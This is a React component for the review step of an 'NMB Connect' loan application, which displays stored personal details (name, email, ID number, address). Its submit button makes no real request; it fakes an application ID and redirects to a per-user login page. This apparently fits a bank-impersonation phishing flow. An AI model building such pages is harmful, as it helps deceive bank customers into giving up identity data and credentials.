import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUserId } from '../hooks/useUserId';
import './Summary.css';

export default function Summary() {
  const navigate = useNavigate();
  const { userId } = useUserId();
  const [isSubmitting, setIsSubmitting] = useState(false);

  const loanAmount = localStorage.getItem('loanAmount');
  const loanTerm   = localStorage.getItem('loanTerm');
  const firstName  = localStorage.getItem('firstName');
  const lastName   = localStorage.getItem('lastName');
  const email      = localStorage.getItem('email');
  const idNumber   = localStorage.getItem('idNumber');
  const address    = localStorage.getItem('address');
  const city       = localStorage.getItem('city');

  const handleSubmit = () => {
    setIsSubmitting(true);
    setTimeout(() => {
      localStorage.setItem('applicationId', 'APP_' + Date.now());
      setIsSubmitting(false);
      navigate(`/${userId}/login`);
    }, 500);
  };

  const handleBack = () => navigate(-1);

  return (
    <div className="summary-container">
      <header className="summary-header">
        <button className="summary-back-btn" onClick={handleBack}>←</button>
        <img src="/logo.svg" alt="NMB Connect Logo" className="summary-logo-img" />
        <div className="summary-logo">NMB<span className="summary-connect">Connect</span></div>
        <div style={{ width: '40px' }}></div>
      </header>

      <main className="summary-main">
        <div className="summary-card">
          <h1 className="summary-title">Review & Submit</h1>
          <p className="summary-subtitle">Verify your information before submission</p>
          <div className="progress-bar"><div className="progress-fill" style={{ width: '66%' }}></div></div>

          <div className="summary-section">
            <h2 className="section-title">Loan Details</h2>
            <div className="section-content">
              <div className="detail-row">
                <span className="detail-label">Loan Amount:</span>
                <span className="detail-value">${parseFloat(loanAmount || 0).toLocaleString()}</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Loan Term:</span>
                <span className="detail-value">{loanTerm} months</span>
              </div>
            </div>
          </div>

          <div className="summary-section">
            <h2 className="section-title">Personal Information</h2>
            <div className="section-content">
              <div className="detail-row"><span className="detail-label">Name:</span><span className="detail-value">{firstName} {lastName}</span></div>
              <div className="detail-row"><span className="detail-label">Email:</span><span className="detail-value">{email}</span></div>
              <div className="detail-row"><span className="detail-label">ID:</span><span className="detail-value">{idNumber}</span></div>
              <div className="detail-row"><span className="detail-label">Address:</span><span className="detail-value">{address}, {city}</span></div>
            </div>
          </div>

          <p className="terms-notice">By continuing, you accept the terms and conditions and authorize NMB to process your application.</p>

          <div className="button-group">
            <button className="btn-back" onClick={handleBack} disabled={isSubmitting}>BACK</button>
            <button className="btn-submit" onClick={handleSubmit} disabled={isSubmitting}>
              {isSubmitting ? 'SUBMITTING...' : 'SUBMIT APPLICATION'}
            </button>
          </div>

          <p className="summary-note">📝 Your application will be reviewed shortly. You'll receive updates via SMS and email.</p>
        </div>
      </main>

      <footer className="summary-footer"><p>Step 2 of 3: Review & Submit</p></footer>
    </div>
  );
}
